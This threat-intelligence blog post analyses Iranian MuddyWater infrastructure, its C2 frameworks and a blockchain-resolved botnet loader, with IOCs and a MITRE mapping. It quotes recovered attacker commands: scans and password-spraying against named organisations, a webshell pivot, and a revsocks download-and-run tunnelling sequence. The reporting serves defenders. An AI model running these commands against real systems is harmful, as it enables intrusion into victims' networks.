---
title: "MuddyWater Exposed: Inside an Iranian APT operation"
classes: wide
header:
  teaser: /assets/images/muddy/logo.png
ribbon: black
description: "A MuddyWater espionage campaign exposed"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Overview

Ctrl-Alt-Intel researchers went hunting for exposed Iranian APT infrastructure. 

We identified and dumped C2 tooling, scripts, logs, victim data, and other operational artefacts from a VPS hosted in the Netherlands. Ctrl-Alt-Intel assesses with high-confidence this server is operated by **MuddyWater** (also tracked as *Static Kitten*, *Mango Sandstorm*, *Earth Vetala*, *Seedworm*, TA450), a cyber espionage group attributed as a subordinate element within **Iran's Ministry of Intelligence and Security** (MOIS).

Repeated operational security failures by the operators allowed our researchers to pivot using [Hunt.io](https://hunt.io/) to identify additional infrastructure that we also attribute to *MuddyWater*.

This blog details the reconnaissance, initial access, command and control, and post-exploitation tradecraft observed - including two developed C2s, a Tsundere Botnet using Ethereum smart contracts, and the targeting of organisations across Israel, Jordan, the UAE, Portugal, and the United States.

> Ctrl-Alt-Intel is not politically affiliated and does not conduct research in support of any government, ideology, or political agenda. The findings presented here are the result of independent threat intelligence research and are shared openly with the security community to help defenders identify, detect, and mitigate threat

# Recon 

MuddyWater was observed leveraging **Shodan** and **Nuclei** to identify potential vulnerable targets. Additionally, **subfinder** and **ffuf** were leveraged to perform enumeration of target web applications: 

## Subfinder / ffuf 

```bash
subfinder -d clearview.ai -o out-clearview..txt
subfinder -d jewishagency[.]org -all
subfinder -d salampalestine[.]org -all
subfinder -d nbn.org[.]il -all
subfinder -d yahelisrael[.]com -all
subfinder -d terrogence[.]com -all

ffuf -u https://www.zivorex.com/FUZZ -w directory-list-lowercase-2.3-medium.txt -e .json,.txt,.zip,.rar
```

* **Clearview AI** - US facial recognition software 
* **Jewish Agency** - Global Jewish community programs (nonprofit/NGO).
* **Salam Palestine** - Volunteer, internship, Arabic-learning, and community/cultural programs in Palestine.
* **Nefesh B'Nefesh (nbn.org[.]il)** - Nonprofit / immigration (Aliyah) facilitation & integration services.
* **Yahel Israel** - Volunteer/service-learning programs and community partnership programs in Israel.
* **Terrogence** - Israeli-owned private intelligence-as-a-service firm
* **Zivorex** - UAE based online platform for selling Gold/Silver

## Shodan CLI

The threat actor used the command `shodan init` to authenticate with the API key, before running `shodan download` with two queries: 

```bash
shodan download --limit -1 --fields ip_str,port ivanti-1 "title:'Ivanti User Portal: Sign In'"
shodan download --limit -1 --fields ip_str,port ivanti-2 'http.favicon.hash:1983356674'
```
Both of these queries were used to identify **Ivanti** devices on the internet. *MuddyWater* additionall scanned using **Nuclei** to identify targets vulnerable to Ivanti **CVE-2026-1281**:

## Nuclei 

```bash
nuclei -l outputIPandport1983356674.txt -t nuclei-templates/http/cves/2026/CVE-2026-1281.yaml -o epmmoutput_fo_198.txt
nuclei -l outputIPandport362091310.txt -t nuclei-templates/http/cves/2026/CVE-2026-1281.yaml -o epmmoutput_362_fo.txt
```
# Initial Access

## Known vulnerabilities

*MuddyWater* attempted to scan and/or exploit the below CVEs:

* **CVE-2026-1731**  - *BeyondTrust* RCE 
* **CVE-2026-1281**  - *Ivanti Endpoint Manager Mobile (EPMM)* code injection
* **CVE-2025-68613** - *n8n* expression authenticated RCE
* **CVE-2025-55182** - *React2Shell*
* **CVE-2025-52691** - *SmarterTools SmarterMail* unrestricted file upload
* **CVE-2025-54068** - *Laravel Livewire* RCE 
* **CVE-2025-34291** - *Langflow* chained account takeover + RCE
* **CVE-2024-55591** - *Fortinet FortiOS* authentication bypass
* **CVE-2024-23113** - *Fortinet FortiOS* RCE
* **CVE-2022-42475** - *Fortinet FortiOS* RCE

## Novel vulnerabilities

*MuddyWater* identified and exploited novel SQL injection vulnerabilities in two websites:

* **BaSalam** - A popular **Iranian** online/social marketplace
* A Postgres development platform

Interestingly, the compromise of an Iranian marketplace by *MuddyWater* is a stark reminder that the Iranian regime is willing to attack its own businesses and people.  

Additionally, *MuddyWater* has targeted a subdomain of a company that runs a "Postgres development platform". Based on the results of their dump, no significant data was taken. 

## Bruteforce / Spraying

Aside from exploiting vulnerabilities, *MuddyWater* has attempted to password spray *Outlook Web Access (OWA)* & *SMTP* services. 

```bash
python owa.py -u users.txt -p morepasswd.txt -f url.txt -m bf -t 10 # Linked to https://webmail.gov.jo

python owa.py -f mail.nmdc-group[.]com -u owausernames.txt -p pass.txt -o out.txt -m bf -t 1

python3 owa.py --url https://gohost.co[.]il/owa/auth/logon.aspx --username user.txt --password pass.txt --threads 5 

python3 owa.py --url https://84.110.105[.]214 --username users.txt --password pass.txt --threads 30 --output success.txt
                     #https://mail.bethadar.com

python3 owa.py --url https://mail.terem[.]com --username user.txt --password pass.txt --threads 5 --output success.txt 
```

* **Jordan Government Webmail** 
* **NMDC Group**: UAE based  provider of marine dredging, energy EPC (Engineering, Procurement, and Construction), 
* **Host & Found (gohost.co[.]il)**: Israeli Managed IT / hosting provider
* **Bet Hadar**: Israeli Medical rehabilitation and nursing center
* **Terem**: Israeli urgent-care / walk-in medical clinic network 

Furthermore, we also saw the tool [patator](https://github.com/lanjelot/patator) used in an attempt to brute-force SMTP:

```bash
patator smtp_login host=mail.nmdc-group[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 -x ignore:fgrep='Authentication failed' -x ignore:fgrep='535' timeout 30
patator smtp_login host=mail.nmdc-group[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 timeout 30
``` 

# Command & Control 

Ctrl-Alt-Intel managed to retrieve multiple C2 server binaries, alongside corresponding clients, that were used by *MuddyWater*. 

Some of the C2 components had previously been discussed by [Group-IB](https://www.group-ib.com/) in their analysis: [Operation Olalampo: Inside MuddyWater’s Latest Campaign](https://www.group-ib.com/blog/muddywater-operation-olalampo/). 

On the *MuddyWater* server identified by Ctrl-Alt-Intel, a subdirectory (`/rdp/c2 rdp`) contained three files:

* `client.exe` - C2 client
* `server` - C2 server binary 
* `server.txt` - Credentials & IP address of C2 server

Notably, within `server.txt` the IP address `162.0.230[.]185` was exposed:

[![1](/assets/images/muddy/2.png){: .align-center .img-border}](/assets/images/muddy/2.png)
<p class="figure-caption">MuddyWater C2 server</p>  

This IP was included within the Group-IB reporting, alongside a splash page displaying “We’ll Be Back Soon” on a MuddyWater-linked IP address (`209.74.87[.]67`) and on the separate domain `netvigil[.]org`.

We observed this identical HTML page served within the exposed infrasture we observed:

[![1](/assets/images/muddy/6.png){: .align-center .img-border}](/assets/images/muddy/6.png)
<p class="figure-caption">MuddyWater HTML splash page</p>  

## Key C2 

*MuddyWater* used a Python-based C2 server over UDP, named **Key C2**. This allows operators to remotely control compromised Windows machines over a custom binary protocol on port **1269** from a singular Python script. 

[![1](/assets/images/muddy/7.png){: .align-center .img-border}](/assets/images/muddy/7.png)
<p class="figure-caption">KeyC2 Python source</p>  

When a client first beacons in, it transmits system information including the computer name, domain, Windows version, and username. The server parses this, assigns the client a numeric ID, and stores it in a local SQLite database. Clients then periodically check in, allowing the operator to see which machines are online.

Once an operator selects a client, Key C2 supports the following capabilities:

* Remote command execution - two modes (`cmd` and `cmdexec`) for executing commands on the victim and streaming output back
* File download - pull files from the compromised machine to the C2 server
* File upload - push files from the C2 server to the victim
* C2 server migration - instruct a client to redirect its beaconing to a different IP address, allowing the operator to move infrastructure without losing access

Ctrl-Alt-Intel observed emojis in the response of output, indicative of AI-assisted development. 

## PersianC2

Ctrl-Alt-Intel identified an additional more mature C2 server used by *MuddyWater* which has been coined **PersianC2**, named after Persian/Farsi strings that were found in the source:

[![1](/assets/images/muddy/9.png){: .align-center .img-border}](/assets/images/muddy/9.png)
<p class="figure-caption">Persian strings</p>  

Unlike **Key C2**'s custom UDP protocol and CLI interface, **PersianC2** used standard HTTP polling. Implants beacon into the server on a configurable sleep interval, picking up queued commands via JSON API endpoints. 

The operator dashboard supports:

* Remote command execution - commands are queued and picked up on the next heartbeat, with output streamed back to the dashboard in real-time
* File upload - push files from the C2 to victims, with live progress tracking and cancel support
* Sleep configuration - adjust the implant's beacon interval per-client
* Staging - a built-in mechanism that takes a template binary (calc.exe), appends a SHA-256 hash derived from the victim's username and computer name, and drops the payload to the victim
* Client removal - queue an `exit!!` command that triggers the implant to self-terminate and deletes the database record

### C2 log analysis

In the **PersianC2** directory we observed the files, `client.db`, `.command_history`, alongside directories `uploads` & `downloads`.

Although only one victim was observed beaconing from a Portuguese IP address, we could see *MuddyWater* operators attempting to run commands on the 23rd February:

```
# 2026-02-23 18:53:26.546078
+upload db.msi dd2.msi

# 2026-02-23 18:56:24.620743
+upload db.msi dd11.msi

# 2026-02-23 19:14:18.041428
+list

# 2026-02-23 19:15:43.499677
+upload cal.exe c22.exe

# 2026-02-23 19:20:00.789845
+cmd ping 8.8.8.8 -n 3
```

## Proxy / Tunneling

*MuddyWater* was observed leveraging the Chinese-developed tool [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) to perform webshell-based SOCKS pivoting. 

```bash
python3 neoreg.py -k 123QWEasd -u https://[REDACTED]/aspnet_client/system_web/4_0_30319/nfud.aspx
```

*MuddyWater* compromised the Exchange server of a Portuguese immigration government-related domain, uploading a **Neo-reGeorg** web-shell to facilitate access to the internal network.
 
Additionally, the tool **resocks** was used to configure SOCKS listeners multiple times:

```bash
./resocks listen --on 0.0.0.0:443 ... -p 0.0.0.0:10843
```

Similarly, an alternative tool **revsocks** was also used by the threat actor to gain access to internal victim networks:

```bash
wget -O rev https://github.com/kost/revsocks/releases/download/v2.9/revsocks_linux_amd64
chmod a+x rev 
./rev 
./rev -listen :443 -socks 0.0.0.0:1080 -pass SuperSecretPassword -ws
nc -lvp 443
./rev -listen :443 -socks 0.0.0.0:1080 -pass SuperSecretPassword -ws
```

# Tsundere EtherHiding

Within the server, we identified that *MuddyWater* had staged a PowerShell loader, `reset.ps1`. The PowerShell loader will lead to execution of obfuscated **Node.js** payloads that appear similar to [Tsundere Botnet](https://securelist.com/tsundere-node-js-botnet-uses-ethereum-blockchain/117979/).

The loader downloads the **Node.js** interpreter to the following file path:

* `%USERPROFILE%\AppData\Local\Nodejs\`

Embedded within the PowerShell loader are AES-CBC/PKCS7 encrypted blobs, which are decrypted and written to disk:

* `%USERPROFILE%\AppData\Local\Nodejs\VfZUSQi6oerKau.js` 
* `%USERPROFILE%\AppData\Local\Nodejs\sysuu2etiprun.js` 

Additionally, a `package.json` file is also written to disk, revealing the Node.js packages the payload would leverage:

```json
{
  "name": "system-service",
  "version": "1.0.0",
  "description": "System service setup",
  "dependencies": {
    "ws": "^8.18.1",
    "ethers": "^6.13.2"
  }
}
```

The **Node.js** script `VfZUSQi6oerKau.js` is used to establish persistence via the creation of a Run key. This script will also trigger execution of the main bot, `sysuu2etiprun.js`.

This sample uses Ethereum smart contracts in order to retrieve the C2 servers. By deobfuscating the sample, we retrieved the following details:

* **Contract** - `0x2B77671cfEE4907776a95abbb9681eee598c102E`
* **ABI func** - `getString()`
* **Query arg** - `0x002E9Eb388CBd72bad2e1409306af719D0DB15e4`

We also observed a hardcoded list of Ethereum RPC nodes that would be used to call the `getString()` function on the smart contract.

## Blockchain hosting C2 servers

Using Etherscan we can view the contracts event log history, revealing lists of C2 servers:

[![1](/assets/images/muddy/1.png){: .align-center .img-border}](/assets/images/muddy/1.png)
<p class="figure-caption">EtherScan Smart Contract History</p>  

This bot communicates over WebSocket to retrieve commands. Two historical IP addresses were observed serving as WebSocket C2 servers:

```
185.236.25[.]119
193.17.183[.]126
```

# Pivoting (with Hunt.io)

In the *Command & Control* section, Ctrl-Alt-Intel researchers identified a C2 IP address `162.0.230[.]185` that had already been linked to *MuddyWater* by Group-IB.

Pivoting on this IP address on the threat intelligence platform [Hunt.io](https://app.hunt.io/file-manager?host=http://162.0.230.185:8881) we can see they have previously caught another associated open-directory: 

[![1](/assets/images/muddy/3.png){: .align-center .img-border}](/assets/images/muddy/3.png)
<p class="figure-caption">Additional MuddyWater open-directories</p>  

Within this open-directory, we observed the payload `second.exe`:

[![1](/assets/images/muddy/4.png){: .align-center .img-border}](/assets/images/muddy/4.png)
<p class="figure-caption">Pivoting on known MuddyWater malware</p>  

We can use the "Search by SHA256" feature to pivot and identify another open-directory on the domain `www.xt24[.]com`:

[![1](/assets/images/muddy/5.png){: .align-center .img-border}](/assets/images/muddy/5.png)
<p class="figure-caption">Pivoting on known MuddyWater malware</p>  

# Attribution Assessment

Ctrl-Alt-Intel assesses with high-confidence that this infrastructure is operated by **MuddyWater** (also tracked as **Static Kitten**, **Mango Sandstorm**, **TEMP.Zagros**, **Earth Vetala**, **Seedworm** or **TA450**), a cyber espionage group attributed as a subordinate element within **Iran's Ministry of Intelligence and Security** (MOIS). 

This assessment is based on the convergence of victimology, tooling overlaps with published MuddyWater research, linguistic artefacts, and infrastructure overlaps.

## Supporting Evidence 

* **Expected victimology** - Targets span Israeli organisations (healthcare, hosting, immigration, intelligence), Jordanian government webmail, UAE companies, US entities, and Jewish/Israeli-linked NGOs - all consistent with known MOIS collection priorities. The compromise of Iranian marketplace **BaSalam** further aligns with MOIS's documented domestic surveillance mandate

* **Direct overlap with Group-IB's Operation Olalampo** - In February 2026, Group-IB published research attributing Operation Olalampo to MuddyWater. We retrieved C2 components previously discussed in that analysis, and observed an identical "We'll Be Back Soon" splash page served on both our identified infrastructure and *MuddyWater*-linked IP addresses referenced in their reporting.

* **Persian/Farsi language artefacts** - Persian/Farsi strings were identified within `.bash_history`, commented source code, and the C2 framework we coined **PersianC2**. This is consistent with the profile of Iranian operators.

* **Exploitation of edge devices** - Exploitation of multiple Fortinet CVEs aligns with a [2021 CISA/FBI joint advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-321a) documenting Iranian state-sponsored actors exploiting Fortinet vulnerabilities since at least March 2021. Similarly, this actor targeted Exchange servers and deployed webshells to Portuguese government infrastructure, consistent with *MuddyWater*'s well-documented history of exploiting Microsoft Exchange for initial access, as highlighted in the same CISA advisories

# Acknowledgements 
 
Whilst writing this blog, Security researcher [@nahamike01](https://x.com/nahamike01) observed **KeyC2** & **Tsundere Botnet** activity linked to MuddyWater campaigns:

[![1](/assets/images/muddy/10.png){: .align-center .img-border}](/assets/images/muddy/10.png)
<p class="figure-caption">@nahamike01 Tweet</p>  

# IOCs

| Indicator | Type | Context |
|---|---|---|
| `185.236.25[.]119` | IP Address | Tsundere Bot WebSocket C2 |
| `193.17.183[.]126` | IP Address | Tsundere Bot WebSocket C2 |
| `162.0.230[.]185` | IP Address | MuddyWater C2 / Open Directory |
| `157.20.182[.]49` | IP Address | Open Directory |
| `209.74.87[.]100` | IP Address | Open Directory |
| `www.xt24[.]com` | Domain | Open Directory |
| `reset.ps1` | Filename | Tsundere Bot PowerShell loader |
| `0x2B77671cfEE4907776a95abbb9681eee598c102E` | Address | Smart Contract Address |
| `7ab597ff0b1a5e6916cad1662b49f58231867a1d4fa91a4edf7ecb73c3ec7fe6` | SHA-256 | `reset.ps1` - Tsundere Bot PowerShell loader |
| `VfZUSQi6oerKau.js` | Filename | Tsundere Bot persistence / launcher script |
| `c8589ca999526f247db4d3902ade8a85619f8f82338c6230d1b935f413ddcb3d` | SHA-256 | `VfZUSQi6oerKau.js` |
| `sysuu2etiprun.js` | Filename | Tsundere Bot main payload |
| `bedb882c6e2cf896e14ecf12c90aaa6638f780017d1b8687a40b4a81956e230f` | SHA-256 | `sysuu2etiprun.js` |

# MITRE ATT&CK

| Tactic | ID | Technique | Observation |
|---|---|---|---|
| **Reconnaissance** | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | Active Scanning: Vulnerability Scanning | Nuclei used to mass-scan for Ivanti EPMM CVE-2026-1281 |
| **Reconnaissance** | [T1590.002](https://attack.mitre.org/techniques/T1590/002/) | Gather Victim Network Information: DNS | `subfinder` used for subdomain enumeration of target organisations |
| **Reconnaissance** | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | Active Scanning: Wordlist Scanning | `ffuf` directory brute-forcing against target web applications |
| **Resource Development** | [T1583.003](https://attack.mitre.org/techniques/T1583/003/) | Acquire Infrastructure: Virtual Private Server | Multiple VPS used to host C2 tooling and operational scripts |
| **Resource Development** | [T1587.001](https://attack.mitre.org/techniques/T1587/001/) | Develop Capabilities: Malware | Custom C2 frameworks developed: **Key C2** (UDP) and **PersianC2** (HTTP) |
| **Resource Development** | [T1588.005](https://attack.mitre.org/techniques/T1588/005/) | Obtain Capabilities: Exploits | Public exploit code and Nuclei templates for multiple CVEs |
| **Resource Development** | [T1588.002](https://attack.mitre.org/techniques/T1588/002/) | Obtain Capabilities: Tool | Open-source tools: Neo-reGeorg, resocks, revsocks, patator |
| **Initial Access** | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Exploitation of Fortinet, Ivanti, Exchange, BeyondTrust, and novel SQLi |
| **Initial Access** | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | OWA password spraying against Israeli, Jordanian, and UAE targets |
| **Initial Access** | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | `patator` SMTP brute-force against NMDC Group mail server |
| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | `reset.ps1` - Tsundere Bot PowerShell loader decrypts and stages Node.js payloads |
| **Execution** | [T1059.007](https://attack.mitre.org/techniques/T1059/007/) | Command and Scripting Interpreter: JavaScript | Obfuscated Node.js payloads (`VfZUSQi6oerKau.js`, `sysuu2etiprun.js`) |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Command and Scripting Interpreter: Windows Command Shell | Key C2 `cmd` and `cmdexec` modes for remote command execution |
| **Persistence** | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Registry Run Keys | `VfZUSQi6oerKau.js` creates a Run key for persistence |
| **Persistence** | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Server Software Component: Web Shell | Neo-reGeorg ASPX webshell (`nfud.aspx`) deployed on compromised Exchange server |
| **Defense Evasion** | [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | Obfuscated Node.js payloads within Tsundere Bot |
| **Defense Evasion** | [T1140](https://attack.mitre.org/techniques/T1140/) | Deobfuscate/Decode Files or Information | Encrypted blobs decrypted at runtime by `reset.ps1` |
| **Command and Control** | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | PersianC2 HTTP polling; Tsundere Bot WebSocket C2 |
| **Command and Control** | [T1095](https://attack.mitre.org/techniques/T1095/) | Non-Application Layer Protocol | Key C2 custom binary protocol over UDP port 1269 |
| **Command and Control** | [T1102.001](https://attack.mitre.org/techniques/T1102/001/) | Web Service: Dead Drop Resolver | Ethereum smart contract used to resolve C2 server IP addresses |
| **Command and Control** | [T1571](https://attack.mitre.org/techniques/T1571/) | Non-Standard Port | Key C2 operating on UDP port 1269 |
| **Command and Control** | [T1090.002](https://attack.mitre.org/techniques/T1090/002/) | Proxy: External Proxy | `resocks` and `revsocks` SOCKS proxy listeners for tunnelling into victim networks |
| **Exfiltration** | [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | Key C2 and PersianC2 both support file download from victims |
| **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) | Data from Local System | SQL injection data exfiltration; file retrieval via C2 |
